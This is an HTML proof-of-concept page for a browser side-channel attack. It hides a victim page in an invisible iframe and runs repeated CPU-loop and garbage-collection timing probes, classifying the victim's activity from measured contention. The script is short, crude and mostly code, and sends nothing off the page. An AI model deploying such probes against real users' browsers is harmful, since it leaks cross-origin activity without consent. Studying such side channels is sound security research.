<!doctype html>
<meta charset="utf-8">
<title>Hybrid Oracle</title>

<h2>Hybrid Side-Channel (Scheduler + GC)</h2>
<pre id="log"></pre>

<iframe src="/spoof/victim.html" style="width:0;height:0;border:0"></iframe>

<script>
const log = m => {
  document.getElementById('log').textContent += m + "\n"
  console.log(m)
}

// ===== PROBE CPU =====
function cpuProbe() {
  const t0 = performance.now()
  let x = 0
  for (let i = 0; i < 4e6; i++) x += i
  return performance.now() - t0
}

// ===== PROBE GC =====
function gcProbe() {
  const t0 = performance.now()
  let arr = []
  for (let i = 0; i < 20000; i++) {
    arr.push([i])
  }
  return performance.now() - t0
}

// ===== HYBRID =====
function measure() {
  const cpu = cpuProbe()
  const gc = gcProbe()

  return {
    cpu,
    gc,
    total: cpu + gc
  }
}

let history = []

setInterval(() => {
  const {cpu, gc, total} = measure()

  history.push(total)
  if (history.length > 20) history.shift()

  const avg = history.reduce((a,b)=>a+b,0)/history.length

  let state = "LOW"
  if (total > avg * 1.5) state = "MEDIUM"
  if (total > avg * 2.2) state = "HIGH 🔥"

  log(
    `cpu=${cpu.toFixed(2)} gc=${gc.toFixed(2)} total=${total.toFixed(2)} => ${state}`
  )

}, 150)
</script>
